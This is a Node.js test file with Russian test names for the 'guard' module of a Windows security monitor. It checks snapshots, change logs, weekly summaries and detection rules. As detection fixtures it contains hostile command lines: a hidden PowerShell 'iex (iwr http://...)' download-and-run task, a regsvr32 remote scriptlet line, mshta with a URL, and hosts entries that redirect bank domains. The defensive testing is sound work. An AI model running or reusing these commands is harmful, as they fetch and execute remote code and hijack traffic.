'use strict';
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const { createStore } = require('../server/store');
const { snapshot, diff, createGuard, KINDS } = require('../server/guard');
const guardRules = require('../server/rules-guard');
const { evaluate, summarize } = require('../server/rules');
const { render } = require('../server/i18n');
const { good, bad } = require('./fixtures/facts');
const { clean, attacked, NOW, daysAgo } = require('./fixtures/guard');

const byId = (list) => new Map(list.map((f) => [f.id, f]));
const tmpStore = () => createStore(fs.mkdtempSync(path.join(os.tmpdir(), 'adamant-guard-')));
const find = (changes, kind, key) => changes.find((c) => c.kind === kind && c.key === key);

const BCD = (first) => `Firmware Boot Manager
---------------------
identifier              {fwbootmgr}
displayorder            {${first}}
                        {${first === 'bootmgr' ? 'usb' : 'bootmgr'}}

Windows Boot Manager
--------------------
identifier              {bootmgr}
description             Windows Boot Manager

Firmware Application (101fffff)
-------------------------------
identifier              {usb}
description             UEFI: USB Drive
`;

// ---------------------------------------------------------------- Слепок и сравнение

test('слепок: все виды на месте, ключи и подписи', () => {
  const f = clean();
  f.boot.bcdFirmware = BCD('bootmgr');
  const s = snapshot(f);
  assert.equal(s.admin, true);
  for (const k of KINDS) assert.ok(s.kinds[k] && typeof s.kinds[k] === 'object', `нет вида ${k}`);
  assert.deepEqual(s.hidden, []);
  assert.ok(s.kinds.autostart['HKCU-Run|OneDrive']);
  assert.ok(s.kinds.services.GoogleUpdaterService);
  assert.ok(s.kinds.rootCerts['CurrentUser:1111111111111111111111111111111111111111']);
  assert.equal(s.kinds.hosts['kubernetes.docker.internal'], '127.0.0.1 kubernetes.docker.internal');
  assert.equal(s.kinds.dns.Ethernet, 'Ethernet: 192.168.1.1');
  assert.deepEqual(s.kinds.proxy, {});
  assert.ok(s.kinds.exclusions['path:d:\\games\\steam']);
  assert.deepEqual(Object.keys(s.kinds.ports).sort(), ['tcp:135', 'tcp:445'], 'порт только для этого компьютера (127.0.0.1) не берётся');
  assert.equal(s.kinds.usb.AA01, 'SanDisk Ultra');
  assert.equal(s.kinds.bootOrder.order, 'Windows Boot Manager → UEFI: USB Drive');
  assert.equal(s.kinds.secureBoot.state, 'включена');
  assert.equal(s.kinds.firewall.Public, 'включён');
});

test('слепок старого отчёта без разделов Стража: не падает, недоступное помечено', () => {
  const s = snapshot(good());
  for (const k of ['services', 'tasks', 'wmi', 'rootCerts', 'hosts', 'dns', 'proxy', 'exclusions', 'usb', 'bootOrder']) {
    assert.equal(s.kinds[k], null, k);
    assert.ok(s.hidden.includes(k), k);
  }
  assert.ok(s.kinds.autostart && s.kinds.admins && s.kinds.ports);
  assert.doesNotThrow(() => snapshot({}));
  assert.doesNotThrow(() => snapshot(null));
});

test('сравнение: новые администратор, сертификат, hosts, DNS, прокси, WMI, исключения, Secure Boot - «важно»', () => {
  const a = clean();
  a.boot.bcdFirmware = BCD('bootmgr');
  const b = attacked();
  b.boot.bcdFirmware = BCD('usb');
  const ch = diff(snapshot(a), snapshot(b));
  const sev = (kind, key) => (find(ch, kind, key) || {}).sev;
  assert.equal(sev('admins', 'S-1-5-21-1-2-3-1005'), 'high');
  assert.equal(sev('rootCerts', 'CurrentUser:2222222222222222222222222222222222222222'), 'high');
  assert.equal(sev('rootCerts', 'LocalMachine:3333333333333333333333333333333333333333'), 'high');
  assert.equal(sev('hosts', 'online.sberbank.ru'), 'high');
  assert.equal(sev('hosts', 'update.microsoft.com'), 'advice', 'блокировка (0.0.0.0) - совет, а не подмена');
  assert.equal(find(ch, 'dns', 'Ethernet').change, 'changed');
  assert.equal(sev('dns', 'Ethernet'), 'high', 'неизвестный публичный DNS');
  assert.equal(sev('proxy', 'ie'), 'high');
  assert.equal(sev('wmi', 'consumer:CommandLineEventConsumer:Updater'), 'high');
  assert.equal(sev('exclusions', 'path:c:\\'), 'high');
  assert.equal(sev('secureBoot', 'state'), 'high');
  assert.equal(find(ch, 'secureBoot', 'state').from, 'включена');
  assert.equal(sev('bootOrder', 'order'), 'high');
  assert.equal(sev('services', 'WinUpd'), 'advice');
  assert.equal(sev('tasks', '\\Updater'), 'advice');
  assert.equal(sev('ports', 'tcp:4444'), 'advice');
  assert.equal(sev('usb', 'BB02'), 'info');
  assert.ok(ch.every((c) => ['added', 'removed', 'changed'].includes(c.change) && ['high', 'advice', 'info'].includes(c.sev)));
  // В обратную сторону - исчезновения: в основном «к сведению».
  const back = diff(snapshot(b), snapshot(a));
  assert.equal(find(back, 'admins', 'S-1-5-21-1-2-3-1005').change, 'removed');
  assert.equal(find(back, 'admins', 'S-1-5-21-1-2-3-1005').sev, 'info');
  assert.equal(find(back, 'secureBoot', 'state').sev, 'info', 'Secure Boot включили - это хорошо');
});

test('сравнение: DNS и сертификаты без ложных тревог', () => {
  const a = clean();
  const b = clean();
  b.persistence.dns = [{ name: 'Ethernet', servers: ['192.168.0.1'] }, { name: 'Wi-Fi', servers: ['8.8.8.8', '1.1.1.1'] }];
  b.persistence.rootCerts.push({ store: 'LocalMachine', thumbprint: '4444', subject: 'CN=GlobalSign Root CA - R6, O=GlobalSign', issuer: '' });
  const ch = diff(snapshot(a), snapshot(b));
  assert.equal(find(ch, 'dns', 'Ethernet').sev, 'info', 'другой роутер - не тревога');
  assert.equal(find(ch, 'dns', 'Wi-Fi').sev, 'advice', 'известные публичные DNS');
  assert.equal(find(ch, 'rootCerts', 'LocalMachine:4444').sev, 'info', 'Windows сама добавляет корневые сертификаты известных центров');
  assert.deepEqual(diff(snapshot(a), snapshot(clean())), [], 'ничего не менялось - изменений нет');
});

test('сравнение: без прав администратора скрытое не считается удалённым', () => {
  const full = clean({ admin: true });
  full.boot.bcdFirmware = BCD('bootmgr');
  const limited = clean({ admin: false });
  const s = snapshot(limited);
  assert.equal(s.kinds.exclusions, null);
  assert.equal(s.kinds.bootOrder, null);
  assert.ok(s.hidden.includes('exclusions'));
  const ch = diff(snapshot(full), s);
  assert.equal(ch.filter((c) => c.kind === 'exclusions' || c.kind === 'bootOrder').length, 0, JSON.stringify(ch));
  assert.deepEqual(ch, []);
  // Раздел не собрался (ошибка) - тоже «не видно».
  const broken = clean();
  delete broken.persistence;
  broken.errors = { persistence: 'Access denied' };
  assert.deepEqual(diff(snapshot(full), snapshot(broken)).filter((c) => c.change === 'removed'), []);
});

// ---------------------------------------------------------------- Хранилище

test('createGuard: первый запуск - молча запоминает, потом сообщает каждое изменение один раз', () => {
  const store = tmpStore();
  let now = NOW - 3 * 86_400_000;
  const g = createGuard(store, { now: () => now });
  const r1 = g.update(clean());
  assert.equal(r1.first, true);
  assert.deepEqual(r1.changes, []);
  assert.ok(fs.existsSync(path.join(store.dataDir, 'guard-baseline.json')));

  now += 86_400_000;
  const r2 = g.update(clean());
  assert.equal(r2.first, false);
  assert.deepEqual(r2.changes, []);

  now += 86_400_000;
  const f = clean();
  f.accounts.admins.push({ name: 'TEST-PC\\support', sid: 'S-1-5-21-9-9-9-1005' });
  f.persistence.hosts.entries.push({ ip: '203.0.113.9', name: 'gosuslugi.ru' });
  const r3 = g.update(f);
  assert.equal(r3.changes.length, 2);
  for (const e of r3.changes) {
    assert.match(e.id, /^[0-9a-f]{12}$/);
    assert.equal(e.ack, false);
    assert.equal(e.at, new Date(now).toISOString());
    assert.ok('from' in e && 'to' in e && e.kind && e.change && e.key && e.label && e.sev);
  }
  now += 86_400_000;
  assert.deepEqual(g.update(f).changes, [], 'базу сдвинули - то же изменение второй раз не сообщается');

  const log = g.log();
  assert.equal(log.length, 2);
  assert.equal(g.log({ days: 0.5 }).length, 0, 'за последние полсуток изменений не было');
  assert.equal(g.log({ days: 2 }).length, 2);
  assert.equal(g.acknowledge([log[0].id, 'нет-такого']), 1);
  assert.equal(g.log().find((e) => e.id === log[0].id).ack, true);
  assert.equal(g.acknowledge(log[0].id), 0, 'повторно - ничего не меняется');
});

test('createGuard: задания проверенного помощника «Адаманта» - свои, подменённое задание с тем же именем - нет', () => {
  const { ownTaskMatcher } = require('../server/guard');
  const { paths, TASKS } = require('../server/helper');
  const P = paths({ SystemRoot: 'C:\\WINDOWS', ProgramFiles: 'C:\\Program Files', ProgramData: 'C:\\ProgramData' });
  const task = (x, args) => ({ path: `\\Adamant\\${x.name}`, name: x.name, state: 3, enabled: true, author: 'Adamant',
    actions: [{ exe: P.powershell.replace('WINDOWS', 'Windows'), args: args || P.taskArgs(x.mode) }], ms: false, company: '', signer: null });
  const store = tmpStore();
  let now = NOW - 3 * 86_400_000;
  const g = createGuard(store, { now: () => now });
  const isOwn = ownTaskMatcher(P, TASKS);
  g.update(clean());
  // Помощник поставлен до этой версии: записи уже в журнале, не отмечены.
  now += 86_400_000;
  const f = clean();
  f.persistence.tasks.push(task(TASKS[0]));
  assert.equal(g.update(f).changes.length, 1);
  // Следующая проверка с проверенным помощником: старая запись отмечается, новое задание сразу своё.
  now += 86_400_000;
  f.persistence.tasks.push(task(TASKS[1]));
  const r = g.update(f, { isOwn });
  assert.deepEqual(r.changes, [], 'свои задания не считаются изменениями');
  const log = g.log();
  assert.equal(log.length, 2);
  for (const e of log) { assert.equal(e.ack, true); assert.equal(e.own, true); assert.equal(e.sev, 'info'); }
  // Подмена: то же имя, другая команда - обычное изменение, не «своё».
  now += 86_400_000;
  f.persistence.tasks[f.persistence.tasks.length - 1] = task(TASKS[1], '-NoProfile -w hidden -c iex (iwr http://203.0.113.9/x)');
  const bad2 = g.update(f, { isOwn });
  assert.equal(bad2.changes.length, 1);
  assert.equal(bad2.changes[0].change, 'changed');
  assert.ok(!bad2.changes[0].own && !bad2.changes[0].ack);
  // Автозапуск значка: только своё значение в HKCU\Run и только своя команда.
  const { ownAutorunMatcher } = require('../server/guard');
  const cmd = '"C:\\WINDOWS\\System32\\wscript.exe" "C:\\Users\\u\\AppData\\Local\\Programs\\Adamant\\windows\\adamant.vbs" --tray';
  const ar = ownAutorunMatcher('Adamant', cmd);
  assert.equal(ar({ kind: 'autostart', change: 'added', key: 'HKCU-Run|Adamant', to: `Adamant: ${cmd}` }), true);
  assert.equal(ar({ kind: 'autostart', change: 'changed', key: 'HKCU-Run|Adamant', to: 'Adamant: "C:\\Users\\u\\evil.exe" --tray' }), false);
  assert.equal(ar({ kind: 'autostart', change: 'added', key: 'HKLM-Run|Adamant', to: `Adamant: ${cmd}` }), false);
  // Задание в другой папке с именем помощника - тоже не своё.
  assert.equal(isOwn({ kind: 'tasks', change: 'added', key: `\\${TASKS[0].name}`, to: `${TASKS[0].name}: ${P.powershell} ${P.taskArgs('full')}` }), false);
});

test('createGuard: проверка без прав администратора не стирает базу и не даёт ложных «исчезло»', () => {
  const store = tmpStore();
  let now = NOW;
  const g = createGuard(store, { now: () => now });
  const full = clean({ admin: true });
  full.boot.bcdFirmware = BCD('bootmgr');
  g.update(full);
  now += 3600_000;
  assert.deepEqual(g.update(clean({ admin: false })).changes, []);
  const base = store.read('guard-baseline.json');
  assert.ok(base.snapshot.kinds.exclusions, 'исключения из полной проверки сохранены');
  assert.ok(base.snapshot.kinds.bootOrder);
  assert.ok(base.security, 'сводка журнала безопасности сохранена');
  // Снова полная проверка: исключение добавилось - это видно.
  now += 3600_000;
  const full2 = clean({ admin: true });
  full2.boot.bcdFirmware = BCD('bootmgr');
  full2.persistence.exclusions.paths.push('C:\\Users\\user\\Downloads');
  const ch = g.update(full2).changes;
  assert.equal(ch.length, 1);
  assert.equal(ch[0].kind, 'exclusions');
  assert.equal(ch[0].sev, 'high');
});

test('createGuard: журнал не больше 1000 записей, пустые и странные сведения не ломают', () => {
  const store = tmpStore();
  let now = NOW;
  const g = createGuard(store, { now: () => now });
  assert.deepEqual(g.update(null), { first: false, changes: [] });
  g.update(clean());
  store.write('guard-log.json', Array.from({ length: 999 }, (_, i) => ({ id: `x${i}`, at: daysAgo(30), kind: 'ports', change: 'added', key: String(i), label: String(i), from: null, to: String(i), sev: 'advice', ack: false })));
  now += 1000;
  const f = clean();
  f.ports.tcp.push({ proto: 'tcp', addr: '0.0.0.0', port: 8080, proc: 'a' }, { proto: 'tcp', addr: '0.0.0.0', port: 8081, proc: 'b' });
  assert.equal(g.update(f).changes.length, 2);
  const all = g.log();
  assert.equal(all.length, 1000);
  assert.ok(all[0].key === 'tcp:8080' || all[0].key === 'tcp:8081', 'новые - первыми');
  store.write('guard-log.json', { broken: true });
  assert.deepEqual(g.log(), []);
});

// ---------------------------------------------------------------- Неделя

test('неделя: спокойно - «попыток взлома не было, ничего не менялось»', () => {
  const store = tmpStore();
  let now = NOW - 2 * 86_400_000;
  const g = createGuard(store, { now: () => now });
  g.update(clean());
  now = NOW;
  g.update(clean());
  const w = g.weekly();
  assert.equal(w.calm, true);
  assert.equal(w.attempts, 0, 'неудачные входы с самого компьютера не считаются');
  assert.equal(w.attackers, 0);
  assert.equal(w.detections, 0);
  assert.equal(w.changes, 0);
  assert.equal(w.unacknowledged, 0);
  assert.equal(render('ru', w.headline), 'Неделя прошла спокойно: попыток взлома не было, ничего не менялось');
  assert.equal(w.to, new Date(NOW).toISOString());
  assert.equal(w.from, new Date(NOW - 7 * 86_400_000).toISOString());
});

test('неделя: без журнала безопасности - не обещает того, чего не видно', () => {
  const store = tmpStore();
  const g = createGuard(store, { now: () => NOW });
  g.update(clean({ admin: false }));
  const w = g.weekly();
  assert.equal(w.attempts, null);
  assert.equal(w.securityVisible, false);
  assert.equal(w.calm, true);
  assert.doesNotMatch(render('ru', w.headline), /попыток взлома не было/);
  assert.equal(createGuard(tmpStore(), { now: () => NOW }).weekly().calm, true, 'без единой проверки не падает');
});

test('неделя: атака, угрозы и незнакомые изменения; «это я» убирает изменения из тревоги', () => {
  const store = tmpStore();
  let now = NOW - 86_400_000;
  const g = createGuard(store, { now: () => now });
  g.update(clean());
  now = NOW;
  const { changes } = g.update(attacked());
  const w = g.weekly();
  assert.equal(w.calm, false);
  assert.equal(w.attempts, 417);
  assert.equal(w.attackers, 2);
  assert.equal(w.detections, 2);
  assert.equal(w.detectionsActive, 1);
  assert.equal(w.changes, changes.length);
  const loud = changes.filter((c) => c.sev !== 'info');
  assert.equal(w.unacknowledged, loud.length);
  assert.match(render('ru', w.headline), /^За неделю: неудачных входов по сети - 417, угроз - 2, незнакомых изменений - \d+/);
  g.acknowledge(loud.map((c) => c.id));
  assert.equal(g.weekly().unacknowledged, 0);
});

// ---------------------------------------------------------------- Правила

test('правила: чистый компьютер - «следов взлома не найдено», без тревог', () => {
  const list = guardRules.evaluate(clean(), { now: NOW });
  const ids = byId(list);
  assert.equal(ids.get('guard-events-ok').sev, 'ok');
  assert.equal(ids.get('guard-persistence-ok').sev, 'ok');
  assert.equal(render('ru', ids.get('guard-events-ok').title), 'Следов взлома за 14 дней не найдено');
  assert.ok(list.every((f) => f.cat === 'guard' && f.id.startsWith('guard-') && ['ok', 'advice', 'unknown'].includes(f.sev)), JSON.stringify(list.filter((f) => !['ok', 'advice', 'unknown'].includes(f.sev))));
  assert.ok(!ids.has('guard-admin-unknown'), 'полная проверка - всё видно');
});

test('правила: без прав администратора - одна находка «не видно» с объяснением', () => {
  const ids = byId(guardRules.evaluate(clean({ admin: false }), { now: NOW }));
  const u = ids.get('guard-admin-unknown');
  assert.equal(u.sev, 'unknown');
  assert.equal(u.text, 'Видно после полной проверки (кнопка «Проверить полностью»)');
  assert.equal(u.evidence.length, 2, 'журнал безопасности и исключения антивируса');
  assert.match(render('ru', ids.get('guard-events-ok').text), /после полной проверки/);
});

test('правила: следы атаки - правильные находки и важность', () => {
  const ids = byId(guardRules.evaluate(attacked(), { now: NOW }));
  const expect = {
    'guard-bruteforce': 'critical', 'guard-logon-internet': 'high', 'guard-logon-rdp': 'advice', 'guard-log-cleared': 'high',
    'guard-user-created': 'high', 'guard-admin-added': 'high', 'guard-service-installed-WinUpd': 'high',
    'guard-threat-active': 'high', 'guard-threat-handled': 'advice', 'guard-rtp-disabled': 'advice', 'guard-powershell': 'advice',
    'guard-service-WinUpd': 'high', 'guard-task-\\Microsoft\\Windows\\Maintenance\\Sync': 'high', 'guard-task-\\Updater': 'advice',
    'guard-wmi-consumer': 'high', 'guard-rootcert': 'high', 'guard-hosts-redirect': 'high', 'guard-hosts-updates': 'advice',
    'guard-proxy': 'advice', 'guard-exclusion-risky': 'high',
  };
  for (const [id, sev] of Object.entries(expect)) {
    assert.ok(ids.has(id), `нет находки ${id}`);
    assert.equal(ids.get(id).sev, sev, id);
  }
  assert.ok(!ids.has('guard-events-ok') && !ids.has('guard-persistence-ok'));
  assert.equal(ids.get('guard-rootcert').evidence.length, 2, 'localhost для разработки не считается');
  assert.equal(ids.get('guard-exclusion-risky').evidence.length, 4, 'папка игры в исключениях - не тревога');
  assert.match(ids.get('guard-bruteforce').evidence[0], /^203\.0\.113\.7 - 400/);
  assert.ok(!ids.get('guard-bruteforce').evidence.some((e) => /192\.168\.1\.50/.test(e)), '3 попытки из своей сети - не подбор');
  assert.equal(ids.get('guard-admin-added').guide, 'admins');
});

test('правила: подбор пароля без включённого RDP - «важно», а не «критично»; мало попыток - не тревога', () => {
  const f = attacked();
  f.rdp = { deny: 1, nla: 1, port: 3389 };
  assert.equal(byId(guardRules.evaluate(f, { now: NOW })).get('guard-bruteforce').sev, 'high');
  const g = clean();
  g.events.security.failed.push({ ip: '192.168.1.50', user: 'user', types: ['3'], count: 9, first: daysAgo(1), last: daysAgo(1) });
  assert.ok(!byId(guardRules.evaluate(g, { now: NOW })).has('guard-bruteforce'));
});

test('правила: известные программы и подписанные файлы не тревожат', () => {
  const r = guardRules.commandRisk;
  assert.equal(r('"C:\\Program Files\\App\\app.exe" /service', 'C:\\Program Files\\App\\app.exe', null), null);
  assert.equal(r('C:\\Users\\u\\AppData\\Local\\Discord\\Update.exe', 'C:\\Users\\u\\AppData\\Local\\Discord\\Update.exe', { status: 'Valid', subject: 'Discord Inc.' }), null);
  assert.equal(r('C:\\Users\\u\\AppData\\Local\\x\\x.exe', 'C:\\Users\\u\\AppData\\Local\\x\\x.exe', { status: 'NotSigned', subject: '' }).sev, 'advice');
  assert.equal(r('C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\MsMpEng.exe', 'C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\MsMpEng.exe', null), null);
  assert.equal(r('powershell.exe -NoProfile -WindowStyle Hidden -File C:\\x.ps1', '', null).sev, 'high');
  assert.equal(r('regsvr32 /s /n /u /i:http://203.0.113.1/a.sct scrobj.dll', '', null).sev, 'high');
  assert.equal(r('wscript.exe "C:\\Program Files\\Vendor\\tool.vbs"', '', null).sev, 'advice');
  assert.equal(r('C:\\Windows\\Temp\\setup.exe /svc', 'C:\\Windows\\Temp\\setup.exe', { status: 'Valid', subject: 'Vendor' }).sev, 'advice', 'подписанный установщик во временной папке');
  assert.equal(r('mshta.exe http://x/a.hta', '', { status: 'Valid', subject: 'Microsoft Windows' }), null, 'подписано Microsoft');
  assert.ok(guardRules.isPrivateIp('192.168.1.5') && guardRules.isPrivateIp('10.8.0.2') && guardRules.isPrivateIp('fe80::1%3'));
  assert.ok(!guardRules.isPrivateIp('203.0.113.7'));
});

test('правила: hosts - блокировка рекламы и Docker не тревожат', () => {
  const f = clean();
  f.persistence.hosts.entries.push({ ip: '0.0.0.0', name: 'ads.example.com' }, { ip: '0.0.0.0', name: 'www.google-analytics.com' }, { ip: '192.168.1.36', name: 'host.docker.internal' });
  const ids = byId(guardRules.evaluate(f, { now: NOW }));
  assert.ok(!ids.has('guard-hosts-redirect') && !ids.has('guard-hosts-updates'));
});

test('правила: старый отчёт без разделов - ничего или одна «не видно»', () => {
  assert.deepEqual(guardRules.evaluate(good(), { now: NOW }), []);
  assert.deepEqual(guardRules.evaluate({}, { now: NOW }), []);
  const f = good();
  f.errors = { events: 'timeout' };
  const list = guardRules.evaluate(f, { now: NOW });
  assert.equal(list.length, 1);
  assert.equal(list[0].sev, 'unknown');
  // Одиночные объекты вместо массивов (так иногда отдаёт PowerShell).
  const g = attacked();
  g.persistence.services = g.persistence.services[2];
  g.events.security.failed = g.events.security.failed[1];
  g.persistence.rootCerts = g.persistence.rootCerts[3];
  assert.doesNotThrow(() => guardRules.evaluate(g, { now: NOW }));
});

test('общие правила: Страж подключён и не портит «хороший» и «плохой» компьютеры', () => {
  const s = summarize(evaluate(clean(), { now: NOW }));
  assert.equal(s.critical, 0);
  assert.equal(s.high, 0);
  assert.ok(evaluate(attacked(), { now: NOW }).some((f) => f.id === 'guard-bruteforce'));
  assert.ok(!evaluate(bad(), { now: NOW }).some((f) => f.cat === 'guard'), 'в старых сведениях разделов Стража нет');
});
